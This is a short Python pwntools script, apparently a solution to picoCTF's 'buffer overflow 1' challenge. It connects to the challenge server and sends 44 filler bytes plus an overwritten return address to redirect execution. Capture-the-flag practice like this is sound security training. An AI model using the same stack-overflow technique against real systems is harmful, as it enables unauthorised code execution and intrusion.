# buffer overflow 1 solution

from pwn import *

s = remote('saturn.picoctf.net', 56752,timeout=5)

recv = s.recvn(26)
print(recv.decode('utf-8'))

dest = b'\xf6\x91\x04\x08\r\n'
payload = b'\x99'*44 + dest

print("Payload:",payload)
s.send(payload)
print("Payload sent")

resp = s.recv(264)
resp = s.recv(264)
resp = s.recv(264)
print("Response:", resp)